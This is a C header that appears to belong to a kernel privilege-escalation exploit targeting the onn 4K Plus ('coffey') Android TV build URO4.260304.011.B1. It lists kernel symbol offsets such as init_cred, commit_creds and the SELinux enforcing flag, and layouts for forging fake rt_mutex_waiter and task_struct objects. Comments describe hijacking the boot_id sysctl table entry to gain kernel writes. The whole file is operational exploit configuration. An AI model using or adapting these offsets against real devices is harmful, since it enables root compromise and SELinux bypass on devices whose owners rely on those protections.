#ifndef TARGET_H
#define TARGET_H

// onn 4K Plus (coffey), URO4.260304.011.B1 / 15051976, kernel 5.15.196
// Provenance: kallsyms extracted from the OTA boot.img Image (vmlinux-to-elf),
// struct layouts from the BTF blob embedded at Image+0x1cdb684, and the
// boot_id ctl_table entry located by scanning for its "boot_id" procname.

#define BUILD_VARIANT_LABEL "coffey_uro4_260304_011_b1"
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "onn/coffey/coffey:14/URO4.260304.011.B1/15051976:user/release-keys"
#endif

// ===== memory layout (VA_BITS=39, 4K pages) =====
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#ifndef P0_PHYS_OFFSET
#define P0_PHYS_OFFSET 0x0ULL             // /proc/zoneinfo start_pfn: 0
#endif
#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD 0x01800000ULL // proven by oops PFNs (PC/R4/R6/R15), 2MiB aligned
#endif
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#ifndef KERNELSNITCH_IDENTITY_END
#define KERNELSNITCH_IDENTITY_END (KERNELSNITCH_IDENTITY_START + 0x100000000ULL)
#endif
#ifndef DIRECT_MAP_BASE
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#endif
#ifndef DIRECT_MAP_END
#define DIRECT_MAP_END (DIRECT_MAP_BASE + 0x100000000ULL)
#endif

// ===== kernel symbols: offset from _text (kallsyms) =====
#define INIT_TASK_OFF 0x0289c200ULL
#define INIT_CRED_OFF 0x0285e4e8ULL
#define ROOT_TASK_GROUP_OFF 0x02997400ULL
#define SELINUX_ENFORCING_OFF 0x029e9078ULL   // selinux_state+0 (DISABLE off)
#define SIG_ENFORCE_OFF 0x029e9078ULL          // unused: FLIP_SIG=0
#define RSCAN_SKIP_FLAG_OFF 0x029e9078ULL      // unused: COFFEY_NO_RSCAN
#define COFFEY_NO_RSCAN 1
#define COFFEY_LINEAR_MAP 1

#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED (KIMAGE_TEXT_BASE + INIT_CRED_OFF)

// ===== sysctl-route: boot_id ctl_table hijack =====
// entry at image+0x288fdc8: procname -> "boot_id" (0xffffffc00982486d),
// data -> sysctl_bootid, mode 0444, handler proc_do_uuid.cfi_jt.
#define CTL_BOOTID_ENTRY_OFF SLIDE_SYSCTL_BOOTID_OFF
#define CTL_TABLE_DATA_FIELD_OFF 0x08
#define CTL_BOOTID_DATA_OFF (CTL_BOOTID_ENTRY_OFF + CTL_TABLE_DATA_FIELD_OFF)
// last entry in random_table: neighbours (extra1/extra2/next) are all zero
#define UUID_DATA_OFF 0x0288fe10ULL

// ===== slide-stage symbols (route not used: linear map is not slid) =====
#define SLIDE_NFULNL_LOGGER_OFF 0x027619b8ULL
#define SLIDE_LOGGERS_0_1_OFF 0x027619b8ULL
// sysctl_bootid @0x2a04931 is odd; the only 8-aligned byte inside the
// 16-byte buffer is +7.
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02a04938ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x0288fdc8ULL   // ctl_table entry
#ifndef USE_PSELECT
#define SLIDE_CARRIER_MCAST 1
#endif
#define SLIDE_MCAST_OPT_DEFAULT 46
#define SLIDE_RT_SCHED_CLASS_OFF 0x01b6a510ULL

#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
#define SLIDE_RT_SCHED_CLASS_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RT_SCHED_CLASS_OFF)

// ===== struct rt_mutex_waiter (BTF, size 0x58) =====
// 5.15 has wake_state@0x40 and ww_ctx@0x50; 5.10 ports put prio at 0x40.
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38
#define WAITER_PRIO_OFF 0x44
#define WAITER_DEADLINE_OFF 0x48
// word 8 (0x40) is wake_state(lo32) | prio(hi32) on this kernel.
#define WAITER_PRIO_WORD (((uint64_t)FAKE_WAITER_PRIO) << 32)

#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_PI_TREE_PRIO_OFF WAITER_PRIO_OFF
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF WAITER_DEADLINE_OFF
#define FAKE_WAITER_TASK_OFF WAITER_TASK_OFF
#define FAKE_WAITER_LOCK_OFF WAITER_LOCK_OFF

// ===== struct task_struct (BTF, size 0x1280) =====
#define FAKE_TASK_USAGE_OFF 0x038
#define FAKE_TASK_PRIO_OFF 0x07c
#define FAKE_TASK_NORMAL_PRIO_OFF 0x084
#define FAKE_TASK_SCHED_CLASS_OFF 0x090
#define FAKE_TASK_PI_LOCK_OFF 0x8ec
#define FAKE_TASK_PI_WAITERS_OFF 0x900
#define FAKE_TASK_PI_TOP_TASK_OFF 0x910
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x918

// ===== struct mm_struct / task fields =====
#define MM_OWNER_OFF 0x348
#define TASK_CRED_OFF 0x800
#define TASK_COMM_OFF 0x810

// ===== KSU loader link addresses (KSU_LOADER=0 on coffey) =====
#define LINK_COMMIT_CRED_ADDR 0xffffffc008179804ULL
#define LINK_BOOTID_CTL_ADDR 0xffffffc00a88fdd0ULL
#define LINK_BOOTID_BUF_ADDR 0xffffffc00aa04931ULL

#endif
